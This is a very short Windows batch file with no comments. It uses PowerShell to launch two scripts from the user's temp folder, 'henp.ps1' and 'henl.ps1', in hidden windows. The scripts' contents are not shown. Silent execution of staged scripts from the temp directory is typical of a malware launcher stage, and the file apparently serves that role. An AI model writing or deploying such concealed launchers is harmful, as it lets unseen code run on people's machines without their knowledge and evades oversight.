@echo off
powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/henp.ps1"
powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/henl.ps1"
